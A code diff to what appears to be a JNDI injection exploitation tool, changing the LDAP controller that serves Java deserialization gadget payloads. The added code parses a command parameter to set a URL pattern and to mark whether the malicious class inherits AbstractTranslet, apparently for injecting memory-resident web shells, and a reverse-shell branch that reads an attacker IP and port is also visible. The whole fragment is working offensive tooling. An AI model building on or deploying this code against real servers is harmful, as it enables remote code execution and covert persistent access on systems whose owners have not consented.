@@ -5,7 +5,7 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
-import com.nu1r.jndi.gadgets.*;
+import com.nu1r.jndi.gadgets.ObjectPayload;
 import com.nu1r.jndi.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
@@ -13,6 +13,8 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
 import static com.nu1r.jndi.gadgets.utils.Utils.getByte;
+import static com.nu1r.jndi.utils.Config.IS_INHERIT_ABSTRACT_TRANSLET;
+import static com.nu1r.jndi.utils.Config.URL_PATTERN;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
@@ -72,8 +74,22 @@ public class SerializedDataController implements LdapController {
                     break;
                 case nu1r:
                     String cmd = Util.getCmdFromBase(base);
-                    params = new String[]{cmd};
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+                    int result1 = cmd.indexOf("-");
+                    if (result1 != -1) {
+                        String[] U = cmd.split("-");
+                        int      i = U.length;
+                        if (i >= 1) {
+                            URL_PATTERN = U[0];
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + U[0]));
+                        }
+                        if (cmd.contains("AbstractTranslet")) {
+                            IS_INHERIT_ABSTRACT_TRANSLET = true;
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 恶意类继承 AbstractTranslet |@"));
+                        }
+                    } else {
+                        params = new String[]{cmd};
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+                    }
                     break;
                 case reverseshell:
                     String[] results = Util.getIPAndPortFromBase(base);
